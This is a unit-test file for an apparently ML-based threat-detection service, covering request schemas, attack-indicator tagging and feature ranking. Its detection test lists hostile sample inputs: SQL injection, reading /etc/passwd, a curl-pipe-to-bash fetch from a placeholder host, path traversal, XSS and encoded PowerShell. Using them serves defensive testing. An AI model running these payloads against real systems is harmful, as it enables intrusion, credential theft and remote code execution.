"""Unit tests for serving schemas and explanations (no model loading)."""

from __future__ import annotations

import numpy as np
import pytest
from pydantic import ValidationError

from threat_detection.serving import explain
from threat_detection.serving.schemas import BatchRequest, Event

pytestmark = pytest.mark.unit


# ------------------------------ schemas ------------------------------------
def test_event_accepts_features_only() -> None:
    assert Event(features={"Flow Duration": 1.0}).payload is None


def test_event_accepts_payload_only() -> None:
    assert Event(payload="ls -la").features is None


def test_event_requires_a_modality() -> None:
    with pytest.raises(ValidationError, match=r"features.*and/or.*payload"):
        Event()


def test_batch_requires_at_least_one_event() -> None:
    with pytest.raises(ValidationError):
        BatchRequest(events=[])


# ------------------------------ explain ------------------------------------
@pytest.mark.parametrize(
    ("payload", "indicator"),
    [
        ("'; DROP TABLE users; --", "sql_injection"),
        ("; cat /etc/passwd", "credential_access"),
        ("$(curl http://x/y.sh | bash)", "shell_injection"),
        ("GET /../../etc/hosts", "path_traversal"),
        ("<script>alert(1)</script>", "xss"),
        ("powershell -enc ZQBjAGgA", "encoded_payload"),
    ],
)
def test_payload_indicators_detects(payload: str, indicator: str) -> None:
    assert indicator in explain.payload_indicators(payload)


def test_payload_indicators_clean_command() -> None:
    assert explain.payload_indicators("git pull origin main") == []


def test_tabular_top_features_returns_k_sorted() -> None:
    importances = np.array([0.1, 0.5, 0.2, 0.05, 0.15] + [0.0] * 73)
    scaled = np.ones(78)
    out = explain.tabular_top_features(importances, scaled, k=3)
    assert len(out) == 3
    # most important feature first
    assert out[0]["importance"] >= out[1]["importance"] >= out[2]["importance"]
